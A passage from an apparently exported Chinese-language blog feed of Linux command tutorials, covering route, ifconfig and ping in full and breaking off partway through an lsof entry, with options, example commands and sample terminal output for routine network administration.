routing tableDestination Gateway Genmask Flags Metric Ref Use Iface192.168.120.0 * 255.255.255.0 U 0 0 0 eth0192.168.0.0 192.168.120.1 255.255.0.0 UG 0 0 0 eth010.0.0.0 192.168.120.1 255.0.0.0 UG 0 0 0 eth0224.0.0.0 - 240.0.0.0 ! 0 - 0 -default 192.168.120.240 0.0.0.0 UG 0 0 0 eth0[root@localhost ~]# route del -net 224.0.0.0 netmask 240.0.0.0 reject[root@localhost ~]# routeKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface192.168.120.0 * 255.255.255.0 U 0 0 0 eth0192.168.0.0 192.168.120.1 255.255.0.0 UG 0 0 0 eth010.0.0.0 192.168.120.1 255.0.0.0 UG 0 0 0 eth0default 192.168.120.240 0.0.0.0 UG 0 0 0 eth0[root@localhost ~]# 实例5：删除和添加设置默认网关&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12route del default gw 192.168.120.240route add default gw 192.168.120.240 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516[root@localhost ~]# route del default gw 192.168.120.240[root@localhost ~]# routeKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface192.168.120.0 * 255.255.255.0 U 0 0 0 eth0192.168.0.0 192.168.120.1 255.255.0.0 UG 0 0 0 eth010.0.0.0 192.168.120.1 255.0.0.0 UG 0 0 0 eth0[root@localhost ~]# route add default gw 192.168.120.240[root@localhost ~]# routeKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface192.168.120.0 * 255.255.255.0 U 0 0 0 eth0192.168.0.0 192.168.120.1 255.255.0.0 UG 0 0 0 eth010.0.0.0 192.168.120.1 255.0.0.0 UG 0 0 0 eth0default 192.168.120.240 0.0.0.0 UG 0 0 0 eth0[root@localhost ~]#]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- ifconfig]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F54.%20Linux%20%E5%91%BD%E4%BB%A4-%20ifconfig%2F</url>
    <content type="text"><![CDATA[Linux 命令- ifconfig&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;许多windows非常熟悉ipconfig命令行工具，它被用来获取网络接口配置信息并对此进行修改。Linux系统拥有一个类似的工具，也就是ifconfig(interfaces config)。通常需要以root身份登录或使用sudo以便在Linux机器上使用ifconfig工具。依赖于ifconfig命令中使用一些选项属性，ifconfig工具不仅可以被用来简单地获取网络接口配置信息，还可以修改这些配置。 1．命令格式1ifconfig [网络设备] [参数] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ifconfig 命令用来查看和配置网络设备。当网络环境发生改变时可通过此命令对网络进行相应的配置。 3．命令参数 up 启动指定网络设备/网卡。 down 关闭指定网络设备/网卡。该参数可以有效地阻止通过指定接口的IP信息流，如果想永久地关闭一个接口，我们还需要从核心路由表中将该接口的路由信息全部删除。 arp 设置指定网卡是否支持ARP协议。 -promisc 设置是否支持网卡的promiscuous模式，如果选择此参数，网卡将接收网络中发给它所有的数据包 -allmulti 设置是否支持多播模式，如果选择此参数，网卡将接收网络中所有的多播数据包 -a 显示全部接口信息 -s 显示摘要信息（类似于 netstat -i） add 给指定网卡配置IPv6地址 del 删除指定网卡的IPv6地址 &lt;硬件地址&gt; 配置网卡最大的传输单元 mtu&lt;字节数&gt; 设置网卡的最大传输单元 (bytes) netmask&lt;子网掩码&gt; 设置网卡的子网掩码。掩码可以是有前缀0x的32位十六进制数，也可以是用点分开的4个十进制数。如果不打算将网络分成子网，可以不管这一选项；如果要使用子网，那么请记住，网络中每一个系统必须有相同子网掩码。 tunel 建立隧道 dstaddr 设定一个远端地址，建立点对点通信 -broadcast&lt;地址&gt; 为指定网卡设置广播协议 -pointtopoint&lt;地址&gt; 为网卡设置点对点通讯协议 multicast 为网卡设置组播标志 address 为网卡设置IPv4地址 txqueuelen&lt;长度&gt; 为网卡设置传输列队的长度 4．使用实例实例1：显示网络设备信息（激活状态的）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ifconfig &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516[root@localhost ~]# ifconfigeth0 Link encap:Ethernet HWaddr 00:50:56:BF:26:20 inet addr:192.168.120.204 Bcast:192.168.120.255 Mask:255.255.255.0 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:8700857 errors:0 dropped:0 overruns:0 frame:0 TX packets:31533 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:596390239 (568.7 MiB) TX bytes:2886956 (2.7 MiB)lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 UP LOOPBACK RUNNING MTU:16436 Metric:1 RX packets:68 errors:0 dropped:0 overruns:0 frame:0 TX packets:68 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:2856 (2.7 KiB) TX bytes:2856 (2.7 KiB) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 eth0 表示第一块网卡， 其中 HWaddr 表示网卡的物理地址，可以看到目前这个网卡的物理地址(MAC地址）是 00:50:56:BF:26:20 inet addr 用来表示网卡的IP地址，此网卡的 IP地址是 192.168.120.204，广播地址， Bcast:192.168.120.255，掩码地址Mask:255.255.255.0 lo 是表示主机的回坏地址，这个一般是用来测试一个网络程序，但又不想让局域网或外网的用户能够查看，只能在此台主机上运行和查看所用的网络接口。比如把 HTTPD服务器的指定到回坏地址，在浏览器输入 127.0.0.1 就能看到你所架WEB网站了。但只是您能看得到，局域网的其它主机或用户无从知道。 第一行：连接类型：Ethernet（以太网）HWaddr（硬件mac地址） 第二行：网卡的IP地址、子网、掩码 第三行：UP（代表网卡开启状态）RUNNING（代表网卡的网线被接上）MULTICAST（支持组播）MTU:1500（最大传输单元）：1500字节 第四、五行：接收、发送数据包情况统计 第七行：接收、发送数据字节数统计信息。 实例2：启动关闭指定网卡&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12ifconfig eth0 upifconfig eth0 down &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ifconfig eth0 up 为启动网卡eth0 ；ifconfig eth0 down 为关闭网卡eth0。ssh登陆linux服务器操作要小心，关闭了就不能开启了，除非你有多网卡。 实例3：为网卡配置和删除IPv6地址&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12ifconfig eth0 add 33ffe:3240:800:1005::2/64ifconfig eth0 del 33ffe:3240:800:1005::2/64 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 ifconfig eth0 add 33ffe:3240:800:1005::2/64 为网卡eth0配置IPv6地址； ifconfig eth0 add 33ffe:3240:800:1005::2/64 为网卡eth0删除IPv6地址； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;练习的时候，ssh登陆linux服务器操作要小心，关闭了就不能开启了，除非有多网卡。 实例4：用ifconfig修改MAC地址&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ifconfig eth0 hw ether 00:AA:BB:CC:DD:EE &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122232425262728293031323334353637[root@localhost ~]# ifconfig eth0 down //关闭网卡[root@localhost ~]# ifconfig eth0 hw ether 00:AA:BB:CC:DD:EE //修改MAC地址[root@localhost ~]# ifconfig eth0 up //启动网卡[root@localhost ~]# ifconfigeth0 Link encap:Ethernet HWaddr 00:AA:BB:CC:DD:EE inet addr:192.168.120.204 Bcast:192.168.120.255 Mask:255.255.255.0 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:8700857 errors:0 dropped:0 overruns:0 frame:0 TX packets:31533 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:596390239 (568.7 MiB) TX bytes:2886956 (2.7 MiB)lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 UP LOOPBACK RUNNING MTU:16436 Metric:1 RX packets:68 errors:0 dropped:0 overruns:0 frame:0 TX packets:68 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:2856 (2.7 KiB) TX bytes:2856 (2.7 KiB)[root@localhost ~]# ifconfig eth0 hw ether 00:50:56:BF:26:20 //关闭网卡并修改MAC地址 [root@localhost ~]# ifconfig eth0 up //启动网卡[root@localhost ~]# ifconfigeth0 Link encap:Ethernet HWaddr 00:50:56:BF:26:20 inet addr:192.168.120.204 Bcast:192.168.120.255 Mask:255.255.255.0 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:8700857 errors:0 dropped:0 overruns:0 frame:0 TX packets:31533 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:596390239 (568.7 MiB) TX bytes:2886956 (2.7 MiB)lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 UP LOOPBACK RUNNING MTU:16436 Metric:1 RX packets:68 errors:0 dropped:0 overruns:0 frame:0 TX packets:68 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:2856 (2.7 KiB) TX bytes:2856 (2.7 KiB) 实例5：配置IP地址&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123[root@localhost ~]# ifconfig eth0 192.168.120.56 [root@localhost ~]# ifconfig eth0 192.168.120.56 netmask 255.255.255.0 [root@localhost ~]# ifconfig eth0 192.168.120.56 netmask 255.255.255.0 broadcast 192.168.120.255 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ifconfig eth0 192.168.120.56 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;给eth0网卡配置IP地：192.168.120.56 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ifconfig eth0 192.168.120.56 netmask 255.255.255.0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;给eth0网卡配置IP地址：192.168.120.56 ，并加上子掩码：255.255.255.0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ifconfig eth0 192.168.120.56 netmask 255.255.255.0 broadcast 192.168.120.255 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/给eth0网卡配置IP地址：192.168.120.56，加上子掩码：255.255.255.0，加上个广播地址： 192.168.120.255 实例6：启用和关闭ARP协议&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12ifconfig eth0 arpifconfig eth0 -arp &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12[root@localhost ~]# ifconfig eth0 arp [root@localhost ~]# ifconfig eth0 -arp &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ifconfig eth0 arp 开启网卡eth0 的arp协议； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ifconfig eth0 -arp 关闭网卡eth0 的arp协议； 实例7：设置最大传输单元&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ifconfig eth0 mtu 1500 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122232425262728293031323334353637[root@localhost ~]# ifconfig eth0 mtu 1480[root@localhost ~]# ifconfigeth0 Link encap:Ethernet HWaddr 00:50:56:BF:26:1F inet addr:192.168.120.203 Bcast:192.168.120.255 Mask:255.255.255.0 UP BROADCAST RUNNING MULTICAST MTU:1480 Metric:1 RX packets:8712395 errors:0 dropped:0 overruns:0 frame:0 TX packets:36631 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:597062089 (569.4 MiB) TX bytes:2643973 (2.5 MiB)lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 UP LOOPBACK RUNNING MTU:16436 Metric:1 RX packets:9973 errors:0 dropped:0 overruns:0 frame:0 TX packets:9973 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:518096 (505.9 KiB) TX bytes:518096 (505.9 KiB)[root@localhost ~]# ifconfig eth0 mtu 1500[root@localhost ~]# ifconfigeth0 Link encap:Ethernet HWaddr 00:50:56:BF:26:1F inet addr:192.168.120.203 Bcast:192.168.120.255 Mask:255.255.255.0 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:8712548 errors:0 dropped:0 overruns:0 frame:0 TX packets:36685 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:597072333 (569.4 MiB) TX bytes:2650581 (2.5 MiB)lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 UP LOOPBACK RUNNING MTU:16436 Metric:1 RX packets:9973 errors:0 dropped:0 overruns:0 frame:0 TX packets:9973 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:518096 (505.9 KiB) TX bytes:518096 (505.9 KiB)[root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设置能通过的最大数据包大小为 1500 bytes &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;备注：用ifconfig命令配置的网卡信息，在网卡重启后机器重启后，配置就不存在。要想将上述的配置信息永远的存的电脑里，那就要修改网卡的配置文件了。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- ping]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F56.%20Linux%20%E5%91%BD%E4%BB%A4-%20ping%2F</url>
    <content type="text"><![CDATA[Linux 命令- ping&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux系统的ping命令是常用的网络命令，它通常用来测试与目标主机的连通性，我们经常会说“ping一下某机器，看是不是开着”、不能打开网页时会说“你先ping网关地址192.168.1.1试试”。它通过发送ICMP ECHO_REQUEST数据包到网络主机（send ICMP ECHO_REQUEST to network hosts），并显示响应情况，这样我们就可以根据它输出的信息来确定目标主机是否可访问（但这不是绝对的）。有些服务器为了防止通过ping探测到，通过防火墙设置了禁止ping或者在内核参数中禁止ping，这样就不能通过ping确定该主机是否还处于开启状态。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;linux下的ping和windows下的ping稍有区别,linux下ping不会自动终止,需要按ctrl+c终止或者用参数-c指定要求完成的回应次数。 1.命令格式1ping [参数] [主机名或IP地址] 2.命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ping命令用于：确定网络和各外部主机的状态；跟踪和隔离硬件和软件问题；测试、评估和管理网络。如果主机正在运行并连在网上，它就对回送信号进行响应。每个回送信号请求包含一个网际协议（IP）和 ICMP 头，后面紧跟一个 tim 结构，以及来填写这个信息包的足够的字节。缺省情况是连续发送回送信号请求直到接收到中断信号（Ctrl-C)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ping 命令每秒发送一个数据报并且为每个接收到的响应打印一行输出。ping 命令计算信号往返时间和(信息)包丢失情况的统计信息，并且在完成之后显示一个简要总结。ping 命令在程序超时或当接收到 SIGINT 信号时结束。Host 参数或者是一个有效的主机名或者是因特网地址。 3.命令参数 -d 使用Socket的SO_DEBUG功能。 -f 极限检测。大量且快速地送网络封包给一台机器，看它的回应。 -n 只输出数值。 -q 不显示任何传送封包的信息，只显示最后的结果。 -r 忽略普通的Routing Table，直接将数据包送到远端主机上。通常是查看本机的网络接口是否有问题。 -R 记录路由过程。 -v 详细显示指令的执行过程。 -c 数目：在发送指定数目的包后停止。 -i 秒数：设定间隔几秒送一个网络封包给一台机器，预设值是一秒送一次。 -I 网络界面：使用指定的网络界面送出数据包。 -l 前置载入：设置在送出要求信息之前，先行发出的数据包。 -p 范本样式：设置填满数据包的范本样式。 -s 字节数：指定发送的数据字节数，预设值是56，加上8字节的ICMP头，一共是64ICMP数据字节。 -t 存活数值：设置存活数值TTL的大小。 4.使用实例实例1：ping的通的情况&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ping 192.168.120.205 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112[root@localhost ~]# ping 192.168.120.205PING 192.168.120.205 (192.168.120.205) 56(84) bytes of data.64 bytes from 192.168.120.205: icmp_seq=1 ttl=64 time=0.720 ms64 bytes from 192.168.120.205: icmp_seq=2 ttl=64 time=0.181 ms64 bytes from 192.168.120.205: icmp_seq=3 ttl=64 time=0.191 ms64 bytes from 192.168.120.205: icmp_seq=4 ttl=64 time=0.188 ms64 bytes from 192.168.120.205: icmp_seq=5 ttl=64 time=0.189 ms--- 192.168.120.205 ping statistics ---5 packets transmitted, 5 received, 0% packet loss, time 4000msrtt min/avg/max/mdev = 0.181/0.293/0.720/0.214 ms[root@localhost ~]# 实例2：ping不通的情况&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ping 192.168.120.202 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213[root@localhost ~]# ping 192.168.120.202PING 192.168.120.202 (192.168.120.202) 56(84) bytes of data.From 192.168.120.204 icmp_seq=1 Destination Host UnreachableFrom 192.168.120.204 icmp_seq=2 Destination Host UnreachableFrom 192.168.120.204 icmp_seq=3 Destination Host UnreachableFrom 192.168.120.204 icmp_seq=4 Destination Host UnreachableFrom 192.168.120.204 icmp_seq=5 Destination Host UnreachableFrom 192.168.120.204 icmp_seq=6 Destination Host Unreachable--- 192.168.120.202 ping statistics ---8 packets transmitted, 0 received, +6 errors, 100% packet loss, time 7005ms, pipe 4[root@localhost ~]# 实例3：ping网关&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ping -b 192.168.120.1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718[root@localhost ~]# routeKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface192.168.120.0 * 255.255.255.0 U 0 0 0 eth0192.168.0.0 192.168.120.1 255.255.0.0 UG 0 0 0 eth010.0.0.0 192.168.120.1 255.0.0.0 UG 0 0 0 eth0default 192.168.120.240 0.0.0.0 UG 0 0 0 eth0[root@localhost ~]# ping -b 192.168.120.1PING 192.168.120.1 (192.168.120.1) 56(84) bytes of data.64 bytes from 192.168.120.1: icmp_seq=1 ttl=255 time=2.02 ms64 bytes from 192.168.120.1: icmp_seq=2 ttl=255 time=1.83 ms64 bytes from 192.168.120.1: icmp_seq=3 ttl=255 time=1.68 ms64 bytes from 192.168.120.1: icmp_seq=4 ttl=255 time=1.98 ms64 bytes from 192.168.120.1: icmp_seq=5 ttl=255 time=1.88 ms--- 192.168.120.1 ping statistics ---5 packets transmitted, 5 received, 0% packet loss, time 4000msrtt min/avg/max/mdev = 1.682/1.880/2.020/0.129 ms 实例4：ping指定次数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ping -c 10 192.168.120.206 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617[root@localhost ~]# ping -c 10 192.168.120.206PING 192.168.120.206 (192.168.120.206) 56(84) bytes of data.64 bytes from 192.168.120.206: icmp_seq=1 ttl=64 time=1.25 ms64 bytes from 192.168.120.206: icmp_seq=2 ttl=64 time=0.260 ms64 bytes from 192.168.120.206: icmp_seq=3 ttl=64 time=0.242 ms64 bytes from 192.168.120.206: icmp_seq=4 ttl=64 time=0.271 ms64 bytes from 192.168.120.206: icmp_seq=5 ttl=64 time=0.274 ms64 bytes from 192.168.120.206: icmp_seq=6 ttl=64 time=0.295 ms64 bytes from 192.168.120.206: icmp_seq=7 ttl=64 time=0.269 ms64 bytes from 192.168.120.206: icmp_seq=8 ttl=64 time=0.270 ms64 bytes from 192.168.120.206: icmp_seq=9 ttl=64 time=0.253 ms64 bytes from 192.168.120.206: icmp_seq=10 ttl=64 time=0.289 ms--- 192.168.120.206 ping statistics ---10 packets transmitted, 10 received, 0% packet loss, time 9000msrtt min/avg/max/mdev = 0.242/0.367/1.251/0.295 ms[root@localhost ~]# 实例5：时间间隔和次数限制的ping&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ping -c 10 -i 0.5 192.168.120.206 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718192021222324252627282930313233[root@localhost ~]# ping -c 10 -i 0.5 192.168.120.206PING 192.168.120.206 (192.168.120.206) 56(84) bytes of data.64 bytes from 192.168.120.206: icmp_seq=1 ttl=64 time=1.24 ms64 bytes from 192.168.120.206: icmp_seq=2 ttl=64 time=0.235 ms64 bytes from 192.168.120.206: icmp_seq=3 ttl=64 time=0.244 ms64 bytes from 192.168.120.206: icmp_seq=4 ttl=64 time=0.300 ms64 bytes from 192.168.120.206: icmp_seq=5 ttl=64 time=0.255 ms64 bytes from 192.168.120.206: icmp_seq=6 ttl=64 time=0.264 ms64 bytes from 192.168.120.206: icmp_seq=7 ttl=64 time=0.263 ms64 bytes from 192.168.120.206: icmp_seq=8 ttl=64 time=0.331 ms64 bytes from 192.168.120.206: icmp_seq=9 ttl=64 time=0.247 ms64 bytes from 192.168.120.206: icmp_seq=10 ttl=64 time=0.244 ms--- 192.168.120.206 ping statistics ---10 packets transmitted, 10 received, 0% packet loss, time 4499msrtt min/avg/max/mdev = 0.235/0.362/1.241/0.294 ms[root@localhost ~]# ping -c 10 -i 0.01 192.168.120.206PING 192.168.120.206 (192.168.120.206) 56(84) bytes of data.64 bytes from 192.168.120.206: icmp_seq=1 ttl=64 time=0.244 ms64 bytes from 192.168.120.206: icmp_seq=2 ttl=64 time=0.195 ms64 bytes from 192.168.120.206: icmp_seq=3 ttl=64 time=0.219 ms64 bytes from 192.168.120.206: icmp_seq=4 ttl=64 time=0.204 ms64 bytes from 192.168.120.206: icmp_seq=5 ttl=64 time=3.56 ms64 bytes from 192.168.120.206: icmp_seq=6 ttl=64 time=1.93 ms64 bytes from 192.168.120.206: icmp_seq=7 ttl=64 time=0.193 ms64 bytes from 192.168.120.206: icmp_seq=8 ttl=64 time=0.193 ms64 bytes from 192.168.120.206: icmp_seq=9 ttl=64 time=0.202 ms64 bytes from 192.168.120.206: icmp_seq=10 ttl=64 time=0.211 ms--- 192.168.120.206 ping statistics ---10 packets transmitted, 10 received, 0% packet loss, time 90msrtt min/avg/max/mdev = 0.193/0.716/3.564/1.080 ms[root@localhost ~]# 实例6：通过域名ping公网上的站点&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ping -c 5 www.58.com &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112peida-VirtualBox ~ # ping -c 5 www.58.comPING www.58.com (211.151.111.30) 56(84) bytes of data.64 bytes from 211.151.111.30: icmp_req=1 ttl=49 time=14.7 ms64 bytes from 211.151.111.30: icmp_req=2 ttl=49 time=16.4 ms64 bytes from 211.151.111.30: icmp_req=3 ttl=49 time=15.2 ms64 bytes from 211.151.111.30: icmp_req=4 ttl=49 time=14.6 ms64 bytes from 211.151.111.30: icmp_req=5 ttl=49 time=19.9 ms--- www.58.com ping statistics ---5 packets transmitted, 5 received, 0% packet loss, time 20101msrtt min/avg/max/mdev = 14.618/16.192/19.917/1.965 mspeida-VirtualBox ~ # 实例7：多参数使用&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ping -i 3 -s 1024 -t 255 192.168.120.206 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122[root@localhost ~]# ping -i 3 -s 1024 -t 255 192.168.120.206PING 192.168.120.206 (192.168.120.206) 1024(1052) bytes of data.1032 bytes from 192.168.120.206: icmp_seq=1 ttl=64 time=1.99 ms1032 bytes from 192.168.120.206: icmp_seq=2 ttl=64 time=0.694 ms1032 bytes from 192.168.120.206: icmp_seq=3 ttl=64 time=0.300 ms1032 bytes from 192.168.120.206: icmp_seq=4 ttl=64 time=0.481 ms1032 bytes from 192.168.120.206: icmp_seq=5 ttl=64 time=0.415 ms1032 bytes from 192.168.120.206: icmp_seq=6 ttl=64 time=0.600 ms1032 bytes from 192.168.120.206: icmp_seq=7 ttl=64 time=0.411 ms1032 bytes from 192.168.120.206: icmp_seq=8 ttl=64 time=0.281 ms1032 bytes from 192.168.120.206: icmp_seq=9 ttl=64 time=0.318 ms1032 bytes from 192.168.120.206: icmp_seq=10 ttl=64 time=0.362 ms1032 bytes from 192.168.120.206: icmp_seq=11 ttl=64 time=0.408 ms1032 bytes from 192.168.120.206: icmp_seq=12 ttl=64 time=0.445 ms1032 bytes from 192.168.120.206: icmp_seq=13 ttl=64 time=0.397 ms1032 bytes from 192.168.120.206: icmp_seq=14 ttl=64 time=0.406 ms1032 bytes from 192.168.120.206: icmp_seq=15 ttl=64 time=0.458 ms--- 192.168.120.206 ping statistics ---15 packets transmitted, 15 received, 0% packet loss, time 41999msrtt min/avg/max/mdev = 0.281/0.531/1.993/0.404 ms[root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-i 3 发送周期为 3秒 -s 设置发送包的大小为1024 -t 设置TTL值为 255]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- lsof]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F53.%20Linux%20%E5%91%BD%E4%BB%A4-%20lsof%2F</url>
    <content type="text"><![CDATA[Linux 命令- lsof&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;lsof（list open files）是一个列出当前系统打开文件的工具。在linux环境下，任何事物都以文件的形式存在，通过文件不仅仅可以访问常规数据，还可以访问网络连接和硬件。所以如传输控制协议 (TCP) 和用户数据报协议 (UDP) 套接字等，系统在后台都为该应用程序分配了一个文件描述符，无论这个文件的本质如何，该文件描述符为应用程序与基础操作系统之间的交互提供了通用接口。因为应用程序打开文件的描述符列表提供了大量关于这个应用程序本身的信息，因此通过lsof工具能够查看这个列表对系统监测以及排错将是很有帮助的。 1．命令格式1lsof [参数] [文件] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用于查看你进程开打的文件，打开文件的进程，进程打开的端口(TCP、UDP)。找回/恢复删除的文件。是十分方便的系统监视工具，因为 lsof 需要访问核心内存和各种文件，所以需要root用户执行。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;lsof打开的文件可以是： 普通文件 目录 网络文件系统的文件 字符或设备文件 (函数)共享库 管道，命名管道 符号链接 网络文件（例如：NFS file、网络socket，unix域名socket） 还有其它类型的文件，等等 3．命令参数 -a 列出打开文件存在的进程 -c&lt;进程名&gt; 列出指定进程所打开的文件 -g 列出GID号进程详情 -d&lt;文件号&gt; 列出占用该文件号的进程 +d&lt;目录&gt; 列出目录下被打开的文件 +D&lt;目录&gt; 递归列出目录下被打开的文件 -n&lt;目录&gt; 列出使用NFS的文件 -i&lt;条件&gt; 列出符合条件的进程。（4、6、协议、:端口、 @ip ） -p&lt;进程号&gt; 列出指定进程号所打开的文件 -u 列出UID号进程详情 -h 显示帮助信息 -v 显示版本信息 4．使用实例实例1：无任何参数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122232425262728[root@localhost ~]# lsofCOMMAND PID USER FD TYPE DEVICE SIZE NODE NAMEinit 1 root cwd DIR 8,2 4096 2 /init 1 root rtd DIR 8,2 4096 2 /init 1 root txt REG 8,2 43496 6121706 /sbin/initinit 1 root mem REG 8,2 143600 7823908 /lib64/ld-2.5.soinit 1 root mem REG 8,2 1722304 7823915 /lib64/libc-2.5.soinit 1 root mem REG 8,2 23360 7823919 /lib64/libdl-2.5.soinit 1 root mem REG 8,2 95464 7824116 /lib64/libselinux.so.1init 1 root mem REG 8,2 247496 7823947 /lib64/libsepol.so.1init 1 root 10u FIFO 0,17 1233 /dev/initctlmigration 2 root cwd DIR 8,2 4096 2 /migration 2 root rtd DIR 8,2 4096 2 /migration 2 root txt unknown /proc/2/exeksoftirqd 3 root cwd DIR 8,2 4096 2 /ksoftirqd 3 root rtd DIR 8,2 4096 2 /ksoftirqd 3 root txt unknown /proc/3/exemigration 4 root cwd DIR 8,2 4096 2 /migration 4 root rtd DIR 8,2 4096 2 /migration 4 root txt unknown /proc/4/exeksoftirqd 5 root cwd DIR 8,2 4096 2 /ksoftirqd 5 root rtd DIR 8,2 4096 2 /ksoftirqd 5 root txt unknown /proc/5/exeevents/0 6 root cwd DIR 8,2 4096 2 /events/0 6 root rtd DIR 8,2 4096 2 /events/0 6 root txt unknown /proc/6/exeevents/1 7 root cwd DIR 8,2 4096 2 / &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;lsof输出各列信息的意义如下： COMMAND：进程的名称 PID：进程标识符 PPID：父进程标识符（需要指定-R参数） USER：进程所有者 PGID：进程所属组 FD：文件描述符，应用程序通过文件描述符识别该文件。如cwd、txt等 （1）cwd：表示current work dirctory，即：应用程序的当前工作目录，这是该应用程序启动的目录，除非它本身对这个目录进行更改 （2）txt ：该类型的文件是程序代码，如应用程序二进制文件本身或共享库，如上列表中显示的 /sbin/init 程序 （3）lnn：library references (AIX); （4）er：FD information error (see NAME column); （5）jld：jail directory (FreeBSD); （6）ltx：shared library text (code and data); （7）mxx ：hex memory-mapped type number xx. （8）m86：DOS Merge mapped file; 